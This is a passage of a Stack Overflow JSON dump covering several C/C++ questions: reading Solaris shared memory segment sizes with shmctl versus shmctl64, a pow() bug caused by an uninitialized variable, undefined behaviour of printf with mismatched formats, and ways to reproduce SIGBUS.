<code>ipcs</code> to see how it does it?"}, {"owner": {"reputation": 55924, "user_id": 5245033, "user_type": "registered", "accept_rate": 53, "profile_image": "https://www.gravatar.com/avatar/6dbfd37ccb940fd2afcd49e966ad97e4?s=128&d=identicon&r=PG&f=1", "display_name": "SergeyA", "link": "https://stackoverflow.com/users/5245033/sergeya"}, "edited": false, "score": 1, "creation_date": 1457550015, "post_id": 35900144, "comment_id": 59461067, "body": "Just run <code>truss ipcs</code> - it will tell you exactly how it did call <code>shmctl</code>."}, {"owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "edited": false, "score": 0, "creation_date": 1457556178, "post_id": 35900144, "comment_id": 59464753, "body": "Or you can look here:  <a href=\"http://src.illumos.org/source/xref/illumos-gate/usr/src/cmd/ipcs/ipcs.c#268\" rel=\"nofollow noreferrer\">src.illumos.org/source/xref/illumos-gate/usr/src/cmd/ipcs/&hellip;</a>"}, {"owner": {"reputation": 51, "user_id": 5838199, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f3a967efb325543ae66979e0d3f37bfe?s=128&d=identicon&r=PG&f=1", "display_name": "olivier", "link": "https://stackoverflow.com/users/5838199/olivier"}, "reply_to_user": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1457559117, "post_id": 35900144, "comment_id": 59466429, "body": "@Barmar I corrected it."}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1457559489, "post_id": 35900144, "comment_id": 59466640, "body": "It looks like <code>shmctl</code> works essentially the same as your code, except it uses <code>shmctl64</code> with the flag <code>IPC_STAT64</code>. But if it gets an error, it simply skips that ID, it doesn&#39;t print the error message."}, {"owner": {"reputation": 51, "user_id": 5838199, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f3a967efb325543ae66979e0d3f37bfe?s=128&d=identicon&r=PG&f=1", "display_name": "olivier", "link": "https://stackoverflow.com/users/5838199/olivier"}, "edited": false, "score": 0, "creation_date": 1457560130, "post_id": 35900144, "comment_id": 59466980, "body": "yes I will test with iError &lt; 0 instead of iError != 0"}, {"owner": {"reputation": 51, "user_id": 5838199, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f3a967efb325543ae66979e0d3f37bfe?s=128&d=identicon&r=PG&f=1", "display_name": "olivier", "link": "https://stackoverflow.com/users/5838199/olivier"}, "edited": false, "score": 0, "creation_date": 1457600879, "post_id": 35900144, "comment_id": 59482854, "body": "I tested with iError &lt; 0, I stil have the same behavior: error message Permission denied. It is normal according to shmctl man : <code>EACCES The cmd  argument  is  equal  to  IPC_STAT  and  {READ}  operation  permission  is denied to the calling process.</code>"}, {"owner": {"reputation": 51, "user_id": 5838199, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f3a967efb325543ae66979e0d3f37bfe?s=128&d=identicon&r=PG&f=1", "display_name": "olivier", "link": "https://stackoverflow.com/users/5838199/olivier"}, "reply_to_user": {"reputation": 55924, "user_id": 5245033, "user_type": "registered", "accept_rate": 53, "profile_image": "https://www.gravatar.com/avatar/6dbfd37ccb940fd2afcd49e966ad97e4?s=128&d=identicon&r=PG&f=1", "display_name": "SergeyA", "link": "https://stackoverflow.com/users/5245033/sergeya"}, "edited": false, "score": 0, "creation_date": 1457605691, "post_id": 35900144, "comment_id": 59486432, "body": "@SergeyA When I run <code>truss ipc -m</code> I have these calls: <code>shmids(0x00000000, 0, 0x08047610) shmids(0x08066468, 17, 0x08047610) write(1, &quot; T                   I D&quot;.., 56) write(1, &quot; S h a r e d   M e m o r&quot;.., 15) shmctl(83886104, IPC_STAT64, 0x08047560) getuid() mmap(0x00010000, 65536, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON|MAP_ALIGN, -1, 0) getuid() getuid() open64(&quot;&#47;var&#47;run&#47;name_service_door&quot;, O_RDONLY) fcntl(3, F_SETFD, 0x00000001) door_info(3, 0xFEF7F4C4) door_call(3, 0x08046EC8) brk(0x08066980) brk(0x0806A980) ... </code> I  will try to use door service."}, {"owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "edited": false, "score": 0, "creation_date": 1457610308, "post_id": 35900144, "comment_id": 59489558, "body": "The door service calls are to look up the UID and GID of the user/group."}, {"owner": {"reputation": 51, "user_id": 5838199, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f3a967efb325543ae66979e0d3f37bfe?s=128&d=identicon&r=PG&f=1", "display_name": "olivier", "link": "https://stackoverflow.com/users/5838199/olivier"}, "edited": false, "score": 0, "creation_date": 1457612159, "post_id": 35900144, "comment_id": 59490923, "body": "I&#39;m trying to test IPC_STAT64 instead of IPC_STAT, do you know which header I should include ?"}, {"owner": {"reputation": 51, "user_id": 5838199, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f3a967efb325543ae66979e0d3f37bfe?s=128&d=identicon&r=PG&f=1", "display_name": "olivier", "link": "https://stackoverflow.com/users/5838199/olivier"}, "edited": false, "score": 0, "creation_date": 1457616248, "post_id": 35900144, "comment_id": 59493805, "body": "I found that I need to include <code>&lt;sys&#47;ipc_impl.h&gt;</code> and it is working ! With shmctl64 and IPC_STAT64 I can get all segments sizes even if I don&#39;t have read rights , perhaps it is a bug in shmctl64 ? in my example the segment of oracle user is big I tried with a small segment and I have the same behavior : shmctl is not able to retrieve segment size, shmctl64 is able to retrieve segment size."}, {"owner": {"reputation": 55924, "user_id": 5245033, "user_type": "registered", "accept_rate": 53, "profile_image": "https://www.gravatar.com/avatar/6dbfd37ccb940fd2afcd49e966ad97e4?s=128&d=identicon&r=PG&f=1", "display_name": "SergeyA", "link": "https://stackoverflow.com/users/5245033/sergeya"}, "edited": false, "score": 0, "creation_date": 1457618751, "post_id": 35900144, "comment_id": 59495682, "body": "@olivier, I doubt it&#39;s a bug :)"}, {"owner": {"reputation": 51, "user_id": 5838199, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f3a967efb325543ae66979e0d3f37bfe?s=128&d=identicon&r=PG&f=1", "display_name": "olivier", "link": "https://stackoverflow.com/users/5838199/olivier"}, "reply_to_user": {"reputation": 55924, "user_id": 5245033, "user_type": "registered", "accept_rate": 53, "profile_image": "https://www.gravatar.com/avatar/6dbfd37ccb940fd2afcd49e966ad97e4?s=128&d=identicon&r=PG&f=1", "display_name": "SergeyA", "link": "https://stackoverflow.com/users/5245033/sergeya"}, "edited": false, "score": 0, "creation_date": 1457626460, "post_id": 35900144, "comment_id": 59501684, "body": "@SergeyA I don&#39;t find any documentation on shmctl64 for Solaris. (information I get is for IBM i <a href=\"https://www.ibm.com/support/knowledgecenter/ssw_ibm_i_72/apis/ipcshmct64.htm\" rel=\"nofollow noreferrer\">ibm.com/support/knowledgecenter/ssw_ibm_i_72/apis/&hellip;</a>) Do you think it is an enhancement instead of a bug ? For me it looks like a kind of security breache. On Linux when I run  ipcs -m with my user it doesn&#39;t display read only shared memory segments created by root."}, {"owner": {"reputation": 55924, "user_id": 5245033, "user_type": "registered", "accept_rate": 53, "profile_image": "https://www.gravatar.com/avatar/6dbfd37ccb940fd2afcd49e966ad97e4?s=128&d=identicon&r=PG&f=1", "display_name": "SergeyA", "link": "https://stackoverflow.com/users/5245033/sergeya"}, "edited": false, "score": 0, "creation_date": 1457627414, "post_id": 35900144, "comment_id": 59502348, "body": "@olivier, you can take it up to Oracle Support if you must :)"}, {"owner": {"reputation": 51, "user_id": 5838199, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f3a967efb325543ae66979e0d3f37bfe?s=128&d=identicon&r=PG&f=1", "display_name": "olivier", "link": "https://stackoverflow.com/users/5838199/olivier"}, "reply_to_user": {"reputation": 55924, "user_id": 5245033, "user_type": "registered", "accept_rate": 53, "profile_image": "https://www.gravatar.com/avatar/6dbfd37ccb940fd2afcd49e966ad97e4?s=128&d=identicon&r=PG&f=1", "display_name": "SergeyA", "link": "https://stackoverflow.com/users/5245033/sergeya"}, "edited": false, "score": 0, "creation_date": 1459340462, "post_id": 35900144, "comment_id": 60240618, "body": "@SergeyA they answer me that I should not use shmctl64."}], "owner": {"reputation": 51, "user_id": 5838199, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f3a967efb325543ae66979e0d3f37bfe?s=128&d=identicon&r=PG&f=1", "display_name": "olivier", "link": "https://stackoverflow.com/users/5838199/olivier"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 899, "favorite_count": 0, "answer_count": 0, "score": 2, "last_activity_date": 1457600750, "creation_date": 1457549456, "last_edit_date": 1457600750, "question_id": 35900144, "link": "https://stackoverflow.com/questions/35900144/get-size-of-all-shared-memory-segments", "title": "get size of all shared memory segments", "body": "<p>On Solaris it is possible to get with shmctl the size of a shared memory segment that I did not created and for which I don't have the permission ? </p>\n\n<p>For example I want to get the size of a segment created by another user with read-only mode for him only (600).</p>\n\n<p>I tried with the code below to get total size of all shared memory segments but I get a permission denied </p>\n\n<blockquote>\n  <p>Cannot access shared memory information for segment 0 because Permission denied</p>\n</blockquote>\n\n<p>when I don't have read rights on a segment.</p>\n\n<pre><code>int *ids = NULL;\nuint_t nids = 0;\nuint_t n;\n\nunsigned long memoryUsed = 0;\n\nif (shmids(ids, nids, &amp;n) != 0)\n{\n   cout &lt;&lt;  \"Failed to get shared memory info: \" &lt;&lt; strerror(errno);\n   return 0;\n}\n\nnids =n;\nids = (int *) realloc(ids, nids * sizeof (int));\n\nif (shmids(ids, nids, &amp;n) != 0)\n{\n    cout &lt;&lt;  \"Failed to get shared memory info: \" &lt;&lt; strerror(errno);\n    return 0;\n}\nelse\n{    \n\n    for (int i = 0; i &lt; n; i++)\n    {\n        struct shmid_ds buf;\n        int iError = shmctl(ids[i], IPC_STAT, &amp;buf);\n        if( iError &lt; 0 )\n        {\n           cout &lt;&lt; \"Cannot access shared memory information for segment \" &lt;&lt; ids[i] &lt;&lt; \" because \" &lt;&lt; strerror(errno) &lt;&lt; endl;\n        } \n        else\n        {\n            memoryUsed += buf.shm_segsz;\n        }\n    }    \n}\n\nreturn memoryUsed;\n</code></pre>\n\n<p>I ask the question because ipcs -ma command is able to get the size of all existing segments therefore I should be able to do the same.</p>\n\n<pre><code>IPC status from &lt;running system&gt; as of Wed Mar  9 19:44:34 MET 2016\nT         ID      KEY        MODE        OWNER    GROUP  CREATOR   CGROUP NATTCH      SEGSZ  CPID  LPID   ATIME    DTIME    CTIME\nShared Memory:\nm        215   0          --rw-------  olivier    staff   olivier  staff      0       4096 10869 10869 19:10:21 19:10:21 19:10:21\nm          0   0x8d0c6ee7 --rw-------  oracle     dba     oracle   dba        4 40956239872   785  2275  7:17:38  7:17:38  7:16:47\n</code></pre>\n"}, {"tags": ["c++", "c"], "comments": [{"owner": {"reputation": 196207, "user_id": 434551, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/8Wzl8.png?s=128&g=1", "display_name": "R Sahu", "link": "https://stackoverflow.com/users/434551/r-sahu"}, "edited": false, "score": 1, "creation_date": 1457549382, "post_id": 35900058, "comment_id": 59460632, "body": "It smells like use of uninitialized variable <code>a</code>. Can&#39;t be certain without a <a href=\"http://stackoverflow.com/help/mcve\">Minimal, Complete, and Verifiable example</a>."}, {"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 0, "creation_date": 1457550466, "post_id": 35900058, "comment_id": 59461367, "body": "Yeah.. down and close vote for showing code, but not showing data.  We don&#39;t even know what type &#39;a&#39; is;("}, {"owner": {"reputation": 55516, "user_id": 892256, "user_type": "registered", "accept_rate": 99, "profile_image": "https://i.stack.imgur.com/15FJW.png?s=128&g=1", "display_name": "Ed Heal", "link": "https://stackoverflow.com/users/892256/ed-heal"}, "edited": false, "score": 0, "creation_date": 1457568207, "post_id": 35900058, "comment_id": 59470539, "body": "if <code>array[0]</code> the MSB - i.e 128 or 1?"}], "answers": [{"comments": [{"owner": {"reputation": 55516, "user_id": 892256, "user_type": "registered", "accept_rate": 99, "profile_image": "https://i.stack.imgur.com/15FJW.png?s=128&g=1", "display_name": "Ed Heal", "link": "https://stackoverflow.com/users/892256/ed-heal"}, "edited": false, "score": 0, "creation_date": 1457564035, "post_id": 35900140, "comment_id": 59468957, "body": "Why are you using <code>pow</code> - an expensive function in this context"}], "tags": [], "owner": {"reputation": 5321, "user_id": 157726, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/PY0sR.png?s=128&g=1", "display_name": "Juan Leni", "link": "https://stackoverflow.com/users/157726/juan-leni"}, "is_accepted": false, "score": 3, "last_activity_date": 1457549901, "last_edit_date": 1457549901, "creation_date": 1457549418, "answer_id": 35900140, "question_id": 35900058, "link": "https://stackoverflow.com/questions/35900058/pow-function-in-c-is-getting-me-wrong-results/35900140#35900140", "title": "pow() function in c is getting me wrong results", "body": "<p>You have not initialised <code>a</code> to 0.</p>\n\n<p>The following should work</p>\n\n<pre><code>int array[8]={\n        0,1,1,0,0,0,0,1\n};\nint *p = array;\nint i;\na = 0                     // &lt;&lt; Initialise a\nfor (i = 0; i&lt;8; i++){\n    if(p[i]!=0){\n        a = a + pow(2,i);\n        printf(\"%i\\n\",a);\n    }\n};\n</code></pre>\n\n<p>You always need to provide an initial value for your variables. Otherwise, you can expect them to start with ANY value. </p>\n\n<p>In the second piece of code you are accumulating <code>a=a+pow(2,i)</code> and it is here where the first time <code>a</code> is used, it will contain some undetermined value.</p>\n"}, {"tags": [], "owner": {"reputation": 3853, "user_id": 2474248, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/BDsoE.jpg?s=128&g=1", "display_name": "machine_1", "link": "https://stackoverflow.com/users/2474248/machine-1"}, "is_accepted": false, "score": 1, "last_activity_date": 1457549670, "creation_date": 1457549670, "answer_id": 35900219, "question_id": 35900058, "link": "https://stackoverflow.com/questions/35900058/pow-function-in-c-is-getting-me-wrong-results/35900219#35900219", "title": "pow() function in c is getting me wrong results", "body": "<p>The problem is in the statement: <code>a = a + pow(2,1);</code>\n<code>a</code> has indeterminate value because it has not been initialized and you are using it in arithmetic operation.</p>\n"}, {"tags": [], "owner": {"reputation": 199706, "user_id": 1566221, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ce3ea4ffd1023d4382f397312352726d?s=128&d=identicon&r=PG", "display_name": "rici", "link": "https://stackoverflow.com/users/1566221/rici"}, "is_accepted": false, "score": 1, "last_activity_date": 1457554671, "creation_date": 1457554671, "answer_id": 35901733, "question_id": 35900058, "link": "https://stackoverflow.com/questions/35900058/pow-function-in-c-is-getting-me-wrong-results/35901733#35901733", "title": "pow() function in c is getting me wrong results", "body": "<p><code>pow</code> is intended to compute the exponential function of two real (not integer) values. So you could use it to compute &pi;<sup>3/2</sup>. It is really not ideal for computing integer powers of 2. Much simpler and faster (though possibly less readable until you get used to it) is to write 2<sup>i</sup> as <code>(1UL &lt;&lt; i)</code>. However, in this particular case you don't need either of those. You could just do the following:</p>\n\n<pre><code>int a = 0;\nfor (int index = 0, value = 1; index &lt; 8; ++index, value *= 2)\n  if (p[i]) a += value;\n</code></pre>\n\n<p>or even more directly</p>\n\n<pre><code>int a = 0;\nfor (int value = 1, *p = array; value &lt; 256; value *= 2, ++p)\n  if (*p) a += value;\n</code></pre>\n\n<p>(As has been mentioned, the problem in your original was not actually the use of <code>pow</code> but rather the absence of the initialization <code>int a = 0</code>.)</p>\n"}, {"comments": [{"owner": {"reputation": 5321, "user_id": 157726, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/PY0sR.png?s=128&g=1", "display_name": "Juan Leni", "link": "https://stackoverflow.com/users/157726/juan-leni"}, "edited": false, "score": 0, "creation_date": 1457564174, "post_id": 35904163, "comment_id": 59469015, "body": "If you found the answers useful, would you mind accepting one?"}], "tags": [], "owner": {"reputation": 53, "user_id": 6041125, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/510bd8449a5dc39c3ba9ecbcf82cf963?s=128&d=identicon&r=PG&f=1", "display_name": "Florian Drucker", "link": "https://stackoverflow.com/users/6041125/florian-drucker"}, "is_accepted": false, "score": -1, "last_activity_date": 1457563363, "creation_date": 1457563363, "answer_id": 35904163, "question_id": 35900058, "link": "https://stackoverflow.com/questions/35900058/pow-function-in-c-is-getting-me-wrong-results/35904163#35904163", "title": "pow() function in c is getting me wrong results", "body": "<p>alright ! i fixed it by adding <code>=0;</code> to the <code>int a;</code>intitialization\nTanks !</p>\n"}], "owner": {"reputation": 53, "user_id": 6041125, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/510bd8449a5dc39c3ba9ecbcf82cf963?s=128&d=identicon&r=PG&f=1", "display_name": "Florian Drucker", "link": "https://stackoverflow.com/users/6041125/florian-drucker"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 140, "favorite_count": 0, "answer_count": 4, "score": -3, "last_activity_date": 1545640966, "creation_date": 1457549157, "last_edit_date": 1545640966, "question_id": 35900058, "link": "https://stackoverflow.com/questions/35900058/pow-function-in-c-is-getting-me-wrong-results", "title": "pow() function in c is getting me wrong results", "body": "<p>I'm trying to convert an 8 bit array into into a number from 0-255 by adding values depending on the position in the field. </p>\n\n<p>if I use </p>\n\n<pre><code>int array[8]={\n            0,1,1,0,0,0,0,1\n    };\n    int *p = array;\n    int i;\n    for (i = 0; i&lt;8; i++){\n        if(p[i]!=0){\n            a = pow(2,i);\n            printf(\"%i\\n\",a);\n        }\n    };\n</code></pre>\n\n<p>I get:</p>\n\n<pre><code>2\n4\n128\n</code></pre>\n\n<p>as results, which would be right so far. \nbut if I use </p>\n\n<pre><code>int array[8]={\n            0,1,1,0,0,0,0,1\n    };\n    int *p = array;\n    int i;\n    for (i = 0; i&lt;8; i++){\n        if(p[i]!=0){\n            a = a + pow(2,i);\n            printf(\"%i\\n\",a);\n        }\n    };\n</code></pre>\n\n<p>I instead get:</p>\n\n<pre><code>2686758\n2686762\n2686890\n</code></pre>\n\n<p>when I expect: </p>\n\n<pre><code>134\n</code></pre>\n\n<p>What am I doing wrong?</p>\n"}, {"tags": ["c", "gcc", "compilation"], "comments": [{"owner": {"reputation": 426981, "user_id": 596781, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/a18405dd4b022837867d1f5453a05f41?s=128&d=identicon&r=PG", "display_name": "Kerrek SB", "link": "https://stackoverflow.com/users/596781/kerrek-sb"}, "edited": false, "score": 0, "creation_date": 1457549049, "post_id": 35900011, "comment_id": 59460404, "body": "Your code has undefined behaviour."}, {"owner": {"reputation": 4888, "user_id": 5785362, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2a786fd81952576dc07942023bf8830b?s=128&d=identicon&r=PG", "display_name": "tofro", "link": "https://stackoverflow.com/users/5785362/tofro"}, "edited": false, "score": 0, "creation_date": 1457549492, "post_id": 35900011, "comment_id": 59460711, "body": "And it is pretty useless to try and <i>investigate</i> UD - Your implementation can do anything or nothing. It is like investigating nonsense."}, {"owner": {"reputation": 29251, "user_id": 3923896, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/4139ee1298ce4b0690a788cb97d47569?s=128&d=identicon&r=PG&f=1", "display_name": "Steve Summit", "link": "https://stackoverflow.com/users/3923896/steve-summit"}, "reply_to_user": {"reputation": 4888, "user_id": 5785362, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2a786fd81952576dc07942023bf8830b?s=128&d=identicon&r=PG", "display_name": "tofro", "link": "https://stackoverflow.com/users/5785362/tofro"}, "edited": false, "score": 0, "creation_date": 1457550601, "post_id": 35900011, "comment_id": 59461460, "body": "@tofro Nevertheless, many textbooks -- including the venerable K&amp;R -- invite readers to experiment and see what happens.  The lesson is supposed to be that the behavior is strange and random, so you shouldn&#39;t depend on it.  Unfortunately some programmers try to learn what behavior they happen to get under one particular compiler on one particular day, and then try to depend on it later."}, {"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 0, "creation_date": 1457550616, "post_id": 35900011, "comment_id": 59461477, "body": "Multi-dup.  Duped so many times I&#39;ve lost count:("}, {"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 0, "creation_date": 1457550681, "post_id": 35900011, "comment_id": 59461511, "body": "<a href=\"http://meta.stackoverflow.com/questions/318526/how-should-we-deal-with-c-language-questions-that-operate-outside-of-the-realm\" title=\"how should we deal with c language questions that operate outside of the realm\">meta.stackoverflow.com/questions/318526/&hellip;</a>"}], "answers": [{"comments": [{"owner": {"reputation": 394, "user_id": 5555395, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/e9f3e26c9d237262a91576f3bfbfd194?s=128&d=identicon&r=PG&f=1", "display_name": "D. Jones", "link": "https://stackoverflow.com/users/5555395/d-jones"}, "edited": false, "score": 0, "creation_date": 1457552710, "post_id": 35900273, "comment_id": 59462699, "body": "That one has answered my question very well(especially para. 2). Thank you!"}], "tags": [], "owner": {"reputation": 29251, "user_id": 3923896, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/4139ee1298ce4b0690a788cb97d47569?s=128&d=identicon&r=PG&f=1", "display_name": "Steve Summit", "link": "https://stackoverflow.com/users/3923896/steve-summit"}, "is_accepted": true, "score": 0, "last_activity_date": 1457550754, "last_edit_date": 1457550754, "creation_date": 1457549842, "answer_id": 35900273, "question_id": 35900011, "link": "https://stackoverflow.com/questions/35900011/c-behaviour-of-printfd-double/35900273#35900273", "title": "c-behaviour of printf(&quot;%d&quot;, &lt;double&gt;)", "body": "<p><code>printf</code> is unusual in that it has no single function signature.  In other words, there's no mechanism to automatically take the actual arguments you pass and convert them into the type that's expected.  Whatever you try to pass, gets passed.  If the type you pass does not match the type expected by the corresponding format specifier, you get nonsense.</p>\n\n<p>Furthermore, if the mismatched types you're passing versus what the format specifiers are expecting have different sizes, <code>printf</code> can end up popping random garbage off the stack, that has nothing to do with what you thought you passed.</p>\n\n<p>You asked, \"doesn't it have to be deterministic?\", and the answer there is a very emphatic \"<strong>NO</strong>\"!  By passing the wrong type of value to <code>printf</code>, you have invoked <em>undefined behavior</em>, which means that anything can happen, and it very definitely does not have to be the same thing twice.</p>\n\n<p>(Even though they're not required to, some compilers peek at the format string and try to check the values you passed against the values that are expected.  For example, under gcc, your first code fragment gets the warning \"format \u2018%d\u2019 expects type \u2018int\u2019, but argument 2 has type \u2018double\u2019\".  But I don't know of a compiler that will try to do conversions to \"fix\" the arguments.)</p>\n"}], "owner": {"reputation": 394, "user_id": 5555395, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/e9f3e26c9d237262a91576f3bfbfd194?s=128&d=identicon&r=PG&f=1", "display_name": "D. Jones", "link": "https://stackoverflow.com/users/5555395/d-jones"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 115, "favorite_count": 0, "closed_date": 1457555295, "accepted_answer_id": 35900273, "answer_count": 1, "score": -4, "last_activity_date": 1457552556, "creation_date": 1457549005, "last_edit_date": 1457552556, "question_id": 35900011, "link": "https://stackoverflow.com/questions/35900011/c-behaviour-of-printfd-double", "closed_reason": "Duplicate", "title": "c-behaviour of printf(&quot;%d&quot;, &lt;double&gt;)", "body": "<p>Why does this code prints nonsense values? If it makes sense then what is it?</p>\n\n<pre><code>printf(\"%d\\n\", 5.0 / 4);\n</code></pre>\n\n<p>By the way, I know about format specifiers I should be using <code>%f</code> instead of <code>%d</code>. but I want to know what c actually does.</p>\n\n<p>Strangely, every time I run the compiled program, it prints a different thing. doesn't it have to be deterministic?</p>\n\n<p>As far as I could observe, this code prints a similar thing:</p>\n\n<pre><code>float c;\nprintf(\"%d\\n\", &amp;c);\n</code></pre>\n\n<p>are they any related?</p>\n\n<p>and when i tried:</p>\n\n<pre><code>float c;\nprintf(\"%d\\n%d\\n\", c, &amp;c);\n</code></pre>\n\n<p>There is a constant 252 between those two values. 256 - sizeof(float) maybe?\nand declaring c as a double makes the difference 0.</p>\n\n<p>Thanks in advance!</p>\n\n<p>UPDATE: writing the same code on different machines yielded different results.(252 being 56. former is a 64-bit ubuntu machine and latter is 64-bit OS X)</p>\n"}, {"tags": ["java", "python", "c", "linux", "sigbus"], "comments": [{"owner": {"reputation": 4888, "user_id": 5785362, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2a786fd81952576dc07942023bf8830b?s=128&d=identicon&r=PG", "display_name": "tofro", "link": "https://stackoverflow.com/users/5785362/tofro"}, "edited": false, "score": 0, "creation_date": 1457549785, "post_id": 35899950, "comment_id": 59460924, "body": "Cross-platform? Without explicitly <i>sending</i> that signal to a process surely not. It might be impossible on systems that do not even know what a bus error might be, for example embedded plain old (e.g. DOS) systems."}, {"owner": {"reputation": 33990, "user_id": 14768, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/b6aMa.png?s=128&g=1", "display_name": "Joshua", "link": "https://stackoverflow.com/users/14768/joshua"}, "edited": false, "score": 0, "creation_date": 1457549835, "post_id": 35899950, "comment_id": 59460959, "body": "DOS can raise SIGBUS if you address memory that doesn&#39;t exist (which requires you to have less than 1MB RAM)."}, {"owner": {"reputation": 496316, "user_id": 57695, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/53ee9941b3fefef67175daf212e62d41?s=128&d=identicon&r=PG", "display_name": "Peter Lawrey", "link": "https://stackoverflow.com/users/57695/peter-lawrey"}, "edited": false, "score": 1, "creation_date": 1457551134, "post_id": 35899950, "comment_id": 59461777, "body": "You can call <code>((DirectBuffer) byteBuffer).cleaner().clean()</code> to unmap a ByteBuffer and if you use it again; SIGBUS."}], "answers": [{"comments": [{"owner": {"reputation": 109504, "user_id": 1093528, "user_type": "registered", "accept_rate": 65, "profile_image": "https://i.stack.imgur.com/VjxwC.jpg?s=128&g=1", "display_name": "fge", "link": "https://stackoverflow.com/users/1093528/fge"}, "edited": false, "score": 0, "creation_date": 1457549238, "post_id": 35900048, "comment_id": 59460531, "body": "<i>grin</i> OK, you got me here... Let&#39;s say, other than purposefully sending this signal to a process?"}, {"owner": {"reputation": 33990, "user_id": 14768, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/b6aMa.png?s=128&g=1", "display_name": "Joshua", "link": "https://stackoverflow.com/users/14768/joshua"}, "reply_to_user": {"reputation": 109504, "user_id": 1093528, "user_type": "registered", "accept_rate": 65, "profile_image": "https://i.stack.imgur.com/VjxwC.jpg?s=128&g=1", "display_name": "fge", "link": "https://stackoverflow.com/users/1093528/fge"}, "edited": false, "score": 0, "creation_date": 1457549290, "post_id": 35900048, "comment_id": 59460564, "body": "The way I do it otherwise is yank out a removable device that has a memory-mapped file on it. If you write to the memory mapping after pulling the device it&#39;s guaranteed to raise because SIGBUS also means IO failed on memory mapped file."}, {"owner": {"reputation": 109504, "user_id": 1093528, "user_type": "registered", "accept_rate": 65, "profile_image": "https://i.stack.imgur.com/VjxwC.jpg?s=128&g=1", "display_name": "fge", "link": "https://stackoverflow.com/users/1093528/fge"}, "edited": false, "score": 0, "creation_date": 1457549589, "post_id": 35900048, "comment_id": 59460785, "body": "Interesting... The only difference between your scenario and the one in the question is the fact that the file still exists; only that the created mapping goes beyong what the file actually contains"}], "tags": [], "owner": {"reputation": 33990, "user_id": 14768, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/b6aMa.png?s=128&g=1", "display_name": "Joshua", "link": "https://stackoverflow.com/users/14768/joshua"}, "is_accepted": false, "score": 3, "last_activity_date": 1457549135, "creation_date": 1457549135, "answer_id": 35900048, "question_id": 35899950, "link": "https://stackoverflow.com/questions/35899950/does-there-exist-a-surefire-cross-platform-way-to-reproduce-a-sigbus/35900048#35900048", "title": "Does there exist a surefire, cross platform way to reproduce a SIGBUS?", "body": "<p>Perhaps not what you were looking for but gets the job done.</p>\n\n<pre><code>$ cat t2.c\n#include &lt;signal.h&gt;\nint main(){raise(SIGBUS);}\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 109504, "user_id": 1093528, "user_type": "registered", "accept_rate": 65, "profile_image": "https://i.stack.imgur.com/VjxwC.jpg?s=128&g=1", "display_name": "fge", "link": 